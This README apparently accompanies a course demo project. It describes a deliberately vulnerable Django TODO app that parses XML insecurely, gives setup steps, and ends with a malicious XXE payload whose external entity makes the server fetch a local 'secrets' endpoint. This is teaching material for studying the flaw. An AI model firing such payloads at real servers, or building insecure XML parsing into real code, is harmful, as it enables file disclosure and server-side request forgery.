Demo Project – XXE and Secrets (Django Applications)

This repository contains a Django-based demo project showcasing how XML External Entity (XXE) attacks can be exploited in web applications, and how sensitive data might be exposed if not properly secured.

🔒 What is an XXE Attack?

XML External Entity (XXE) attacks exploit vulnerabilities in XML parsers that improperly process external entities. Malicious attackers can use XXE to:

1) Access local files on the server

2) Execute internal network requests (Server-Side Request Forgery - SSRF)

3) Leak sensitive information (e.g., system files or environment variables)

4) Possibly escalate to remote code execution under certain configurations

This vulnerability is common when user-supplied XML input is parsed insecurely without disabling external entity resolution.

📦 Project Structure

This project consists of two Django apps:

XXE/ – A deliberately vulnerable TODO list app that parses XML data insecurely to demonstrate XXE attacks.

Secrets/ – A protected app that stores sensitive data. It's not meant for direct access, but can be exposed via XXE exploitation.


🧰 Prerequisites

Ensure the following are installed before you begin:

1) Python 3.9 or higher 

2) Django (latest stable version) – Install with pip: pip install django

3) A virtual environment (optional but recommended): python -m venv venv


🚀 Getting Started

Follow these steps to set up and run the project:

1) git clone https://github.com/psu-cse597-s25/heartbleed-analysis.git

2) cd to the working directory. Here it is Demo/xxeExploit

# (Optional) Create and activate virtual environment
python -m venv venv

source venv/bin/activate  # Windows: venv\Scripts\activate


3) python3 manage.py makemigrations

4) python3 manage.py migrate


5) python manage.py runserver

Visit browser at: http://127.0.0.1:8000/

To access the main XML validation test page, go to:

👉 http://127.0.0.1:8000/validation_page/


🧪 How to Trigger the XXE Vulnerability

The xxe app allows users to submit XML payloads using /save_todo/ API. By submitting specially crafted malicious XML, you can observe how improperly configured XML parsing can leak sensitive files or system data.

Sample payloads are listed here for testing.

--> Common EndPoint: http://127.0.0.1:8000/save_todo/ 

Benign Payload:

    <?xml version="1.0"?>
    <data>
        <todo>
            <title>Security Analysis Final presentation</title>
            <status>False</status>
        </todo>
    </data>

Malicious Payload:

    <?xml version="1.0"?>
    <!DOCTYPE data [


    <!ENTITY xxe SYSTEM "http://127.0.0.1:8000/secrets/">
    <!-- Use 127.0.0.1 instead of localhost -->
    ]>
    <data>&xxe;</data>